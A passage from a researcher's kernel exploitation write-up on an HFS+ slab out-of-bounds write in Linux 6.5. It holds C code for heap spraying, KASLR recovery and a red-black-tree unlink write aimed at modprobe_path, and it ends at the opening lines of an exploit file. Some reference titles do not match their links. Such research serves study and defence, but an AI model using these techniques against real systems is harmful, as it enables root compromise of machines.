e.(SizeofExprOperator).getExprOperand().getFullyConverted().getType()\n    or\n    result = e.(SizeofTypeOperator).getTypeOperand()\n  }\n\n  Struct getStruct() {\n    exists(Expr sof |\n      this.getSizeArg().getAChild*() = sof and\n      this.sizeofParam(sof) = result\n    )\n  }\n\n  string isFlexible() {\n    this.getSize() = \"unknown\" and\n    this.getStruct().getAField() instanceof FlexibleArrayMember and\n    result = \"true\"\n    or\n    not this.getSize() = \"unknown\" and\n    not this.getStruct().getAField() instanceof FlexibleArrayMember and\n    result = \"false\"\n  }\n}\n\nfrom KmallocCall kfc, Struct s\nwhere\n  s = kfc.getStruct() and\n  not kfc.getSizeArg().isAffectedByMacro()\nselect kfc.getLocation(), kfc, s, s.getLocation(), s.getSize(), kfc.getFlag(), kfc.getSize(),\n  kfc.getArgument(0), kfc.isFlexible()</pre><p>And the last resort, Chuck <a href=\"https://api.chucknorris.io/jokes/etd9c1v9smqxo2xonfm2lq\">Norris approach</a> of mine is to actually give up on all those static analysis methods and actually set breakpoints in gdb.</p><p>After all, it is not that hard to intercept all  calls and filter for allocations that end up in our generic kmalloc-1k slab cache.</p><p>The results? </p><p>Again, we would love to work in kmalloc-1k all the way, but it turns out that there are only a handful of elastic objects we can spray there on 6.5, and for our KASLR bypass, we actually need an object that has some references to pointers that we can use to do arithmetic on based on our kernel build to recover the random offset that was added in the beginning.</p><p>Maybe I overlooked something, but based on resources from the kernel CTF community, the best candidate object I found was tty_struct. Here’s a summary from :</p><p>The bad news, though, is that  is allocated with the accounting flag on:</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/**\n * alloc_tty_struct - allocate a new tty\n * @driver: driver which will handle the returned tty\n * @idx: minor of the tty\n *\n * This subroutine allocates and initializes a tty structure.\n *\n * Locking: none - @tty in question is not exposed at this point\n */\nstruct tty_struct * alloc_tty_struct(struct tty_driver * driver, int idx) {\n    struct tty_struct * tty;\n    tty = kzalloc(sizeof( * tty), GFP_KERNEL_ACCOUNT);\n    if (!tty) return NULL;</pre><p>This means that it is allocated in kmalloc-cg-1k and not in kmalloc-1k. Simple as that.</p><p>This is the point where it would have made sense to look for more options that enables staying within the normal kmalloc-1k.</p><p>Still, given all the hardening measures that are already present in Ubuntu 24.04 already shipping hardened kernel 6.8, it makes a lot of sense to actually face the inevitable: modern slab UAF and OOB exploits <em>will probably have to rely on cross-cache attacks for better or worse from now on.</em> An probably some even more sophisticated attacks if <a href=\"https://lwn.net/Articles/944647/\">those get killed as well</a>. (Don’t take me wrong, that’s excellent news for security, but here we are taking an offensive security approach and a hacker mindset.)</p><p>We think the attentive reader knows where this is going, we are going to  cross-cache into kmalloc-cg-1k as an exercise and reuse all the nice properties of tty_struct for kaslr leak and profit.</p><p>So long story short, no ones likes cross-cache attacks, because they are difficult, they have a reputation for being unreliable (<em>although, interestingly, if you follow references to citations where this is claimed, you won’t find any definite statistics)</em>.</p><p>There aren’t that many kernel developers with a firm understanding of them, maybe only those folks who have the time and resources to write kernel CTFs for fun. One systematic study recently <a href=\"https://www.usenix.org/system/files/usenixsecurity24-maar-slubstick.pdf\">published</a> attempts to come up with a universal approach for turning very weak memory corruption primitives into practical cross-cache attacks, but for kmalloc-1k, we couldn’t really reproduce their results unfortunately.</p><p>On the other hand, there is a classic Etenal writeup for CVE-2022-27666 that illustrates the idea and it has a much more practical approach – note that he had absolutely no choice but go down this path: <a href=\"https://etenal.me/archives/1825\">https://etenal.me/archives/1825</a>.</p><p>Additionally, there is willsroot’s CTF problem and analysis for a cool little cross-cache trick that is not super transferable to real life: https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html, but very cool. And I’m sure there are a bunch of more, but the fact that Will said this in 2022:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\"> I found resources on this strategy quite scarce, and haven’t personally seen a CTF challenge that requires it.</pre><p>Well, this reassures me that it makes a lot of sense to dig deeper here for pedagogical reasons.</p><p>As with everything in computer science, the idea is generally simple. The point of the slab/slub allocator in the kernel is to do allocations practically optimally for objects which are smaller than a page, and as much as small object allocation happens so frequently in the kernel that the allocator had to be optimized multiple times to eventually arrive at the current SLUB architecture, it turns out that optimizing page allocation performance is just as crucial for memory allocation.</p><p>Turns out, that problem had been already solved by the time Linux gained real traction.</p><p>The original idea was invented by Harry Markowitz in the 60’s, and it was popularized in Donald Knuth’s The Art of Computer Programming that is referenced in <a href=\"https://www.kernel.org/doc/gorman/html/understand/understand009.html\">kernel docs</a>. Similarly to other material you find in those volume of books, it remained a somewhat unsexy topic among kernel hackers to discuss page allocations until recently.</p><p>So, to get a better grip on the concept, I attempted to write a simple simulator. The general idea is that, since this is not use-after-free:</p><ul><li>We just have to allocate a bunch of objects, and at some point, the kmem_cache is going to allocate a slab from the page allocator (turns out to be an order-1 page block, which means it is 2*pagesize)</li><li>This is also true for kmalloc-1k and kmalloc-cg-1k.</li><li>The conclusion is that as I long as I can trigger the allocation of objects in both of these slab caches at roughly the same time, I might have a chance.</li></ul><ul><li>By running a bunch of simulated runs to convince me that whenever an order-2 or oder-3 page block split happens, there will be a healthy time window for kernel space code to grab two consecutive page allocations that are next to each other, like spatially next to each other</li></ul><p>I realized that at this point this becomes utterly speculative, so I coded up some python to see for myself.</p><p>Whenever there is a vertical red dotted line, we end up in a situation where two allocations randomly resulted in a scenario that is ideal for page level heap feng-shui: we could just overwrite our vulnerable slab, make the target slab grab the order-1 pages from the page allocator, and then we could just overflow into that memory region.</p><p>Etenal (who seems to be a <a href=\"https://creation.etenal.me/\">great photographer</a> apart from being an elite kernel hacker, on an unrelated note) writes:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">To mitigate this noise, I did something shown below:\n\n1. drain the freelist of order 0, 1, 2.\n2. allocate tons of order-2 objects(assume it’s N), by doing so, order 2 will borrow pages from order 3.\n3. free every half of objects from step 2, hold the other half. This creates N/2 more object back to order-2’s freelist.\n4. free all objects from step 1</pre><p>This works like charm on a fairly idle QEMU system. Does it work in production? That depends on the memory allocation noise, but practically speaking it works well for OOB reads. The state of the buddy allocator free list is actually exposed via proc for each order:</p><p>One thing is for sure, since we are targeting kmalloc-1k which allocates slabs of length 8k bytes, corresponding to order-1 page allocations, it makes a lot of sense to trigger our OOB write on page-2 heap sprays.</p><p>Why? Because, thanks to Donald Knuth, there is no question about one thing: just around the time when order-2 allocations were just split into to buddies in the buddy allocator, there is a high chance that we can grab two consecutive allocations for the memory regions backing our isolated  slabs.</p><p>Going back to our simulator and implementing the draining looks something like this:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\"> def simulate_time_evolution(self):\n        \"\"\"Simulate kernel noise generation over a series of time steps.\"\"\"\n        for time_step in range(TIME_STEPS):\n            self.generate_noise()\n        # Simulate freelist draining for cross-cache heap fengshui\n        if time_step == 80:\n            print(\"Draining freelists\")\n            buddyinfo = self.buddy_allocator.get_free_list_state()\n            for _ in range(buddyinfo[0]):\n                 self.buddy_allocator.allocate(0)\n            for _ in range(buddyinfo[1]):\n                 self.buddy_allocator.allocate(1)\n            for _ in range(1):\n                 self.buddy_allocator.allocate(2)\n\n        # Record the current state of the buddy allocator's free lists\n        self.free_list_history.append(self.buddy_allocator.get_free_list_state())\n        # Check for consecutive order-1 block allocations\n        self.check_consecutive_allocations(time_step)</pre><p>And this indeed results in a few spots ideal for cross-cache OOB  like this:</p><p>To test the concept further, we wrote a little kernel module that exposes a  node as a sort of timing side-channel and it allows userspace to check whether these two consecutive slab allocations actually happened. Results?</p><p>Guess what, when Etenal says:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">Once it borrows pages from a higher order, two consecutively allocations will split the higher-order pages, and most importantly, the higher-order pages are a chunk of contiguous memory.</pre><p>He is not wrong. Turns out that within 0.2 seconds from splitting order-2 page blocks, we are able to experimentally verify on a real kernel that this is the best time window to do a cross-cache attack that attempts to position two seperate  slabs close to each other in memory (kmalloc-1k and kmalloc-cg-1k) so that our cross cache OOB becomes feasible. </p><p>The nice part is that Mr. Knuth’s algorithm was optimized for performance which makes a lot of sense, but it is actually detrimental to the system that we can stay within 0.1 seconds within the intended time window on production kernels simply by collecting some stats on my own build that we instrumented with timing side channel facilities.</p><p>As simple as the following idea is, I’ve never seen it in exploits or CTF solutions. Since we can still not be completely sure about the cross-cache timing, we are going to rely on our ability to read up to 65k. Given that we are trying to cross-cache from kmalloc-1k to kmalloc-cg-1k slabs, this means that we have 8 complete slabs worth of slabs to miss, and we will still be able to read  sprayed all over kernel memory.</p><p>Do we know exact offsets? No, we don’t, but we don’t actually have to.</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/* Function to search for pointer triples and calculate KASLR base */\nvoid find_pointer_triples(uint8_t * buffer, int buffer_size, int * success, uint64_t * kaslr_base_out) {\n  for (int i = 0; i &lt; buffer_size - 8; i++) {\n    /* Extract the first pointer */\n    uint64_t first_ptr = extract_pointer(buffer, i);\n\n    if (!is_valid_pointer(first_ptr))\n      /* Skip invalid pointers */\n      continue;\n\n    /* Extract the second pointer at the offset */\n    int second_ptr_pos = i + OFFSET_2ND_PTR;\n\n    if (second_ptr_pos + 8 &gt; buffer_size)\n      continue;\n\n    uint64_t second_ptr = extract_pointer(buffer, second_ptr_pos);\n\n    if (!is_valid_pointer(second_ptr))\n      continue;\n\n    /* Extract the third pointer at the next offset */\n    int third_ptr_pos = second_ptr_pos + OFFSET_3RD_PTR - OFFSET_2ND_PTR;\n\n    if (third_ptr_pos + 8 &gt; buffer_size)\n      continue;\n\n    uint64_t third_ptr = extract_pointer(buffer, third_ptr_pos);\n\n    if (!is_valid_pointer(third_ptr))\n      continue;\n\n    /* Calculate the differences */\n    int64_t diff_first = first_ptr - BASE_ADDR_FIRST;\n    int64_t diff_second = second_ptr - BASE_ADDR_SECOND;\n    int64_t diff_third = third_ptr - BASE_ADDR_THIRD;\n\n    printf(\"\\n[+] Pointer triple found at byte offset %x:\\n\", i);\n    printf(\"\\tFirst pointer:  0x%lx (Difference: 0x%lx)\\n\", first_ptr, diff_first);\n    printf(\"\\tSecond pointer: 0x%lx (Difference: 0x%lx)\\n\", second_ptr, diff_second);\n    printf(\"\\tThird pointer:  0x%lx (Difference: 0x%lx)\\n\", third_ptr, diff_third);\n\n    /* If all three differences match, calculate the KASLR base */\n    if (diff_first == diff_second &amp;&amp; diff_first == diff_third) {\n      uint64_t kaslr_base = diff_first + KERNEL_BASE;\n\n      printf(\"\\n[+] KASLR base: 0x%lx\\n\", kaslr_base);\n      * success = 1;\n      * kaslr_base_out = kaslr_base;\n\n      /* Stop once we find the KASLR base */\n      return;\n    }\n  }\n}</pre><p>As simple as it looks like, the point of this code is just to search for kernel pointer looking values in the kernel leak dump. Given the structure of , it becomes trivial to figure out the KASLR base with basic arithmetic. At this point, all that remains is to achieve some kind of stronger write primitive and escalate <a href=\"https://hu.wikipedia.org/wiki/Erd%C5%91s_P%C3%A1l\">modprobe_path</a>, now that we know where we are in memory.</p><p>It is super simple, but actually the inspiration for this came from an old script that my long-time hero, Imre Rad (<a href=\"https://security.googleblog.com/2022/06/announcing-winners-of-2021-gcp-vrp-prize.html\">of GCP hacking fame</a>) wrote back when we were coworkers in a penest lab. His Perl script was able to go through a physical memory dump obtained via JTAG from embeddded Linux devices and look for kernel data structures to recover complete process trees using similar offset-based heuristics with  and related data, and it proved to be very useful on different occasions.</p><h5>Arbitrary write via red-black trees</h5><p>At this point we have all the basic blocks to actually start exploiting the vulnerability.</p><p>We have a base address. Moreover, we are more than comfortable overwriting anything in  or  with something like a 7/8 chance on first try.</p><p>Given all the hardship we went through in , it would be really nice to go for a simple in-cache overflow for the RIP control this time. As we discussed earlier, the objects to spray into arbitrary s are running out, but still in 6.5, we have the luxury to allocate :</p><pre data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/**\n * simple_xattr_alloc - allocate new xattr object\n * @value: value of the xattr object\n * @size: size of @value\n *\n * Allocate a new xattr object and initialize respective members. The caller is\n * responsible for handling the name of the xattr.\n *\n * Return: On success a new xattr object is returned. On failure NULL is\n * returned.\n */\nstruct simple_xattr * simple_xattr_alloc(const void * value, size_t size) {\n  struct simple_xattr * new_xattr;\n  size_t len;\n\n  /* wrap around? */\n  len = sizeof( * new_xattr) + size;\n  if (len &lt; sizeof( * new_xattr))\n    return NULL;\n\n  new_xattr = kvmalloc(len, GFP_KERNEL);\n  if (!new_xattr)\n    return NULL;\n\n  new_xattr -&gt; size = size;\n  memcpy(new_xattr -&gt; value, value, size);\n  return new_xattr;\n}</pre><p>Does this code makes any sense from a  accounting perspective, given that unprivileged users could just randomly allocate a bunch of attributes on in-memory file systems, and write it down on the cost of ? No, it doesn’t, so it was changed to  in more recent kernel versions.</p><p>Still, in Linux 6.5, we can still corrupt these objects via our primitive in  trivially. How trivially? Well, it was shown by starlabs and some other folks that  inodes store extended attributes using  structures and then it is only a matter of a small exercise to overwrite one of them to execute an unlink attack, given t<a href=\"https://starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/\">hat these are part of a linked list</a> per-inode with zero hardening.</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">static inline void\n__rb_change_child(struct rb_node *old, struct rb_node *new,\n          struct rb_node *parent, struct rb_root *root)\n{\n    if (parent) {\n        if (parent-&gt;rb_left == old)\n            WRITE_ONCE(parent-&gt;rb_left, new);\n        else\n            WRITE_ONCE(parent-&gt;rb_right, new);\n    } else\n        WRITE_ONCE(root-&gt;rb_node, new);\n}</pre><p>and the calling context, it is tempting to imagine a kind of red-black tree unlink attack similar to a linked list unlink attack. Practically speaking, we can always ensure using a bunch of attacker controlled nodes and extended attributes to achieve some kind of memory corruption.</p><p>Still, the best course of action is to realize that on kmalloc-1k it is enough to spray 16 objects to saturate at least one  slab. The way red-black trees are laid out in memory, the simple little idea that I’m actually pioneering in this writeup is the following.</p><ul><li>Calculate how many  have to spray and into which kmalloc cache (For instance, in , 8 objects can fit on a single slab)</li><li>Make sure you can overwrite  comfortably using your OOB or UAF primitive</li></ul><p>Given that one allocates say, 16  from userspace, that will result in 8 of them ending up in some unused slab, and another 8 in our cpu main-slab. So far that is accepted behavior, but given that we are able to allocate some vulnerable object in the same  we can overwrite one of the last 8  allocated objects. Now, this usually means that among a red-black tree of 15 nodes, one variable is forced to take on a random node.</p><p>Well, we don’t know which, so we are running to risk of completely crashing the kernel after a few tries if we are not careful by corrupting the tree in various really bad ways.</p><p>Now I’m sure that my favorite mathematician <a href=\"https://hu.wikipedia.org/wiki/Erd%C5%91s_P%C3%A1l\">Paul Erdos</a> would have loved to spend time on the general problem of figuring out all the interesting things that can happen if you are given a random red-black tree and a randomly selected node of it and you started to ask algorithmic questions about the resulting structures.</p><p>Since we are completely stupid compared to that guy, what we are going to do instead is allocate a bunch of nodes in an order so that our last 8 allocations, that happen to be the interesting allocations that our write primitive can overwrite – so we allocate them in a way that they happen to be <strong>8 red leaf nodes at the bottom</strong> for our red black tree. How? Well, just basic python will tell you that this works:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">void spray_xattr(void)\n{\n    char xattr_name[XATTR_NAME_MAX_SIZE];\n    char xattr_value[XATTR_NAME_MAX_SIZE];\n\n    int base_nodes[] = {7, 3, 11, 1, 5, 9, 13};\n    int leaf_nodes[] = {0, 2, 4, 6, 8, 10, 12, 14};\n    int base_size = sizeof(base_nodes) / sizeof(base_nodes[0]);\n    int leaf_size = sizeof(leaf_nodes) / sizeof(leaf_nodes[0]);\n\n    for (int i = 100; i &lt; 111; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", i, i);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%d\", i);\n        setxattr(\"/tmp/tmpfs/xattr_node_3\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n\n\n    for (int i = 0; i &lt; base_size; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", base_nodes[i], base_nodes[i]);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", base_nodes[i]);\n        setxattr(\"/tmp/tmpfs/xattr_node\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n\n    for (int i = 0; i &lt; leaf_size; i++) {\n        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, \"attilaszia-%d%512d\", leaf_nodes[i], leaf_nodes[i]);\n        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, \"security.%02d\", leaf_nodes[i]);\n        setxattr(\"/tmp/tmpfs/xattr_node\", xattr_name, xattr_value, strlen(xattr_value), 0);\n    }\n\n}</pre><p>My data structures knowledge was pretty rusty when going into this, so if you are wondering why this works, here’s the gist of it.</p><h5>Red-Black Tree Properties Recap</h5><ol><li>Every node is either red or black.</li><li>The root is always black.</li><li>Red nodes cannot have red children (i.e., no two consecutive red nodes on any path).</li><li>Every path from a node to its descendant null nodes must have the same number of black nodes, called the black-height.</li></ol><p>Now, let’s break down what happens when you delete a :</p><ol><li><strong>Leaf Removal Doesn’t Affect Black-Height:</strong><ul><li>A red leaf has no children, and removing it doesn’t affect the black nodes along any path to the null nodes. Therefore, the  of all paths remains the same, preserving that invariant.</li></ul></li><li><strong>Red Node with No Red Parent:</strong><ul><li>By property 3, a red node cannot have a red parent, so deleting a red leaf doesn’t violate the rule about consecutive red nodes. The red parent (if it exists) is either black, or the red leaf was itself a root with no parent in which case this case doesn’t arise.</li></ul></li></ol><p>The order of insertions looks somewhat random, and actually there are multiple choices there. Coding up some more python, we used a simple  canvas to visualize what happens inside the data structure in the kernel when we are allocating these extended attributes:</p><p>This way, we are avoiding all the sketchy tree rotations during the erase calls, since those would definitely mess up our pointers and result in unhandled pagefaults and kernel crashes. Operations of this sort are problematic ():</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">static __always_inline void\n____rb_erase_color(struct rb_node *parent, struct rb_root *root,\n    void (*augment_rotate)(struct rb_node *old, struct rb_node *new))\n{\n    struct rb_node *node = NULL, *sibling, *tmp1, *tmp2;\n\nwhile (true) {\n    /*\n     * Loop invariants:\n     * - node is black (or NULL on first iteration)\n     * - node is not the root (parent is not NULL)\n     * - All leaf paths going through parent and node have a\n     *   black node count that is 1 lower than other leaf paths.\n     */\n    sibling = parent-&gt;rb_right;\n    if (node != sibling) {  /* node == parent-&gt;rb_left */\n        if (rb_is_red(sibling)) {\n            /*\n             * Case 1 - left rotate at parent\n             *\n             *     P               S\n             *    / \\             / \\\n             *   N   s    --&gt;    p   Sr\n             *      / \\         / \\\n             *     Sl  Sr      N   Sl\n             */\n            tmp1 = sibling-&gt;rb_left;\n            WRITE_ONCE(parent-&gt;rb_right, tmp1);\n            WRITE_ONCE(sibling-&gt;rb_left, parent);\n            rb_set_parent_color(tmp1, parent, RB_BLACK);\n            __rb_rotate_set_parents(parent, sibling, root,\n                        RB_RED);\n            augment_rotate(parent, sibling);\n            sibling = tmp1;\n        }</pre><p>Once that is done, we have an almost arbitrary write.</p><p>As we saw above, similarly to an unlink attack, we have something like  and .</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">Unfortunately, `next` is written to `prev` in line 2. This means that `prev` must be a valid pointer as well. This poses a significant restriction on the values that we can write to `next`. However, we can take advantage of the physmap to provide valid `prev` values.\n\nThe physmap is a region of kernel virtual memory where physical memory pages are mapped contiguously. For example, if a machine has 4GiB (2^32 bytes) of memory, 32 bits (4 bytes) are required to address each byte of physical memory available in the system. Assuming the physmap starts at 0xffffffff00000000, any address from 0xffffffff00000000 to 0xffffffffffffffff will be valid as every value (from 0x00000000-0xffffffff) of the lower 4 bytes are required to address memory.</pre><p>In our case, we are working with code in <code>include/linux/rbtree_augmented.h</code>:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">static __always_inline struct rb_node *\n__rb_erase_augmented(struct rb_node *node, struct rb_root *root,\n             const struct rb_augment_callbacks *augment)\n{\n    struct rb_node *child = node-&gt;rb_right;\n    struct rb_node *tmp = node-&gt;rb_left;\n    struct rb_node *parent, *rebalance;\n    unsigned long pc;\n\n    if (!tmp) {\n        /*\n         * Case 1: node to erase has no more than 1 child (easy!)\n         *\n         * Note that if there is one child it must be red due to 5)\n         * and node must be black due to 4). We adjust colors locally\n         * so as to bypass __rb_erase_color() later on.\n         */\n        pc = node-&gt;__rb_parent_color;\n        parent = __rb_parent(pc);\n        __rb_change_child(node, child, parent, root);\n        if (child) {\n            child-&gt;__rb_parent_color = pc;\n            rebalance = NULL;\n        } else\n            rebalance = __rb_is_black(pc) ? parent : NULL;\n        tmp = parent;\n    } else if (!child) {\n        /* Still case 1, but this time the child is node-&gt;rb_left */\n        tmp-&gt;__rb_parent_color = pc = node-&gt;__rb_parent_color;\n        parent = __rb_parent(pc);\n        __rb_change_child(node, tmp, parent, root);\n        rebalance = NULL;\n        tmp = parent;</pre><p>In  we overwrite the parent pointer with the child pointer as we discussed above. However, if the child pointer is not null, we also have to deal with <code>child-&gt;__rb_parent_color = pc;</code>. That is, we would like to perform the physmap trick by mapping our child pointer to a valid range (), and only introducing the ASCII characters on the lower bits of the address. There is one problem, though. When I tried this in gdb first, all of my write operations looked like that they are 4 of 8 bytes aligned.</p><p>As most of us, security researchers, as much as I’m comfortable looking at assembly or decompiled Ghidra listings all day, I’m actually terrible at understanding C code as it is written with its fancy keywords and compiler directives, so first I suspected that this was the problem:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">struct rb_node {\n    unsigned long  __rb_parent_color;\n    struct rb_node *rb_right;\n    struct rb_node *rb_left;\n} __attribute__((aligned(sizeof(long))));\n    /* The alignment might seem pointless, but allegedly CRIS needs it */</pre><p>Although I exploited the issue with a ROP chain earlier, this was a scary moment because I really wanted to make this modprobe attack work. It was scary because an 8 bytes alignment could have prevented me from reusing the idea. Why? The reason is mundane. It is because the original value of the variable is  and we only control 4 bytes in our payload address. How can we overwrite this path to something attacker controllable like  if we can only write  and some junk? Starlabs’ solution was to leave the leading slash in /sbin, and position the write off-bye-one to that. See where this is going? If we can only write at 8 bytes boundaries, we are in trouble. Luckily, the reason for the aligned writes was not due to <code>__attribute__((aligned(sizeof(long))))</code>, but something much more simple, this __rb_parent macro:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">#define __rb_parent(pc)    ((struct rb_node *)(pc &amp; ~3))\n\n#define __rb_color(pc)     ((pc) &amp; 1)\n#define __rb_is_black(pc)  __rb_color(pc)\n#define __rb_is_red(pc)    (!__rb_color(pc))</pre><p>This is called in the above code snippet. The idea is that the lower bits of the parent pointer store the color of the node, an the rest is used as the actual pointer. Luckily, it is only a 32 bits alignment. Therefore, we can execute the attack , first overwriting the path at the beginning by  , then shifting the pointer by another 4 bytes, and writing  or something else that we like. And this finally concludes the exploit. Once  is redirected to a file of our control, exploitation becomes trivial:</p><ol><li> – https://en.wikipedia.org/wiki/Mac_OS_X</li><li><strong>Introduction to Apple File System</strong> – https://en.wikipedia.org/wiki/Apple_File_System</li><li><strong>macOS High Sierra Information</strong> – https://en.wikipedia.org/wiki/MacOS_High_Sierra</li><li><strong>Apple’s HFS Plus File System Documentation</strong> – https://developer.apple.com/library/archive/technotes/tn/tn1150.html</li><li><strong>Research on HFS Plus Structure</strong> – https://dl.acm.org/doi/pdf/10.1145/3391202</li><li><strong>LWN Article Investigating Kernel Exploits</strong> – https://lwn.net/Articles/652468/</li><li><strong>Kernel Exploit Write-up Follow-up</strong> – https://lwn.net/Articles/652472/</li><li><strong>Linux Kernel Commit: kmalloc-cg-* Introduction</strong> – https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552</li><li><strong>Definition of GFP_KERNEL_ACCOUNT in Linux</strong> – https://elixir.bootlin.com/linux/v6.5/C/ident/GFP_KERNEL_ACCOUNT</li><li><strong>Exploring Linux’s Random kmalloc Caches</strong> – https://sam4k.com/exploring-linux-random-kmalloc-caches/#introducing-random-kmalloc-caches</li><li><strong>Linux Commit Attempting to Kill Caches</strong> – https://github.com/torvalds/linux/commit/734bbc1c97ea7e46e0e53b087de16c87c03bd65f</li><li><strong>Linux Security Summit Talk on Kernel Vulnerabilities</strong> – https://www.youtube.com/watch?v=2hYzxsWeNcE&amp;ab_channel=TheLinuxFoundation</li><li><strong>KASLR (Kernel Address Space Layout Randomization)</strong> – https://lwn.net/Articles/569635/</li><li><strong>Privilege Escalation via execve Calls</strong> – https://sam4k.com/like-techniques-modprobe_path/</li><li><strong>Linux Source: fs/hfsplus/hfsplus_raw.h</strong> – https://github.com/torvalds/linux/blob/master/fs/hfsplus/hfsplus_raw.h</li><li><strong>Linux man-pages for setxattr System Call</strong> – https://man7.org/linux/man-pages/man2/setxattr.2.html</li><li><strong>Article on HFS Plus Known Issues</strong> – https://etenal.me/archives/1825</li><li><strong>Study on Slab Allocator Elasticity</strong> – https://dl.acm.org/doi/10.1145/3372297.3423353</li><li><strong>pahole Tool for Examining Structure Padding</strong> – https://linux.die.net/man/1/pahole</li><li> – https://api.chucknorris.io/jokes/etd9c1v9smqxo2xonfm2lq</li><li><strong>Kernel Exploit:  Documentation</strong> – https://github.com/smallkirby/kernelpwn/blob/master/structs.md#tty_struct</li><li><strong>Kernel Exploit:  Documentation</strong> – https://github.com/smallkirby/kernelpwn/blob/master/structs.md#tty_file_private</li><li><strong>Kernel Exploit:  Documentation</strong> – https://github.com/smallkirby/kernelpwn/blob/master/structs.md#poll_list</li><li><strong>Kernel Exploit:  Documentation</strong> – https://github.com/smallkirby/kernelpwn/blob/master/structs.md#user_key_payload</li><li><strong>Kernel Exploit:  Documentation</strong> – https://github.com/smallkirby/kernelpwn/blob/master/structs.md#_setxattr</li><li><strong>Kernel Exploit:  Documentation</strong> – https://github.com/smallkirby/kernelpwn/blob/master/structs.md#seq_operations</li><li><strong>Kernel Exploit:  Documentation</strong> – https://github.com/smallkirby/kernelpwn/blob/master/structs.md#subprocess_info</li><li><strong>Discussion of Killed Kernel Objects</strong> – https://lwn.net/Articles/944647/</li><li><strong>SLUB Allocator Security Paper</strong> – https://www.usenix.org/system/files/usenixsecurity24-maar-slubstick.pdf</li><li><strong>Understanding the Linux Kernel Memory Allocator</strong> – https://www.kernel.org/doc/gorman/html/understand/understand009.html</li><li><strong>Personal Website of Photographer</strong> – https://creation.etenal.me/</li><li><strong>Winners of the 2021 GCP VRP Prize</strong> – https://security.googleblog.com/2022/06/announcing-winners-of-2021-gcp-vrp-prize.html</li><li><strong>Linked List Behavior in Kernel Structures</strong> – https://starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/</li><li><strong>starlabs: Exploiting io_uring Bugs</strong> – https://starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/</li></ol><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">/*\n * exploit.c\n *\n * Attila Szasz &lt;szasza.contact@gmail.com&gt;\n * @4ttil4sz1a\n *\n * Exploit for hfs+ slab out of bounds write\n * targeting Linux kernel 6.5\n *\n */\n\n#define _GNU_SOURCE\n\n#include &lt;fcntl.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sched.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;sys/ioctl.h&gt;\n#include &lt;sys/types.h&gt;\n#include 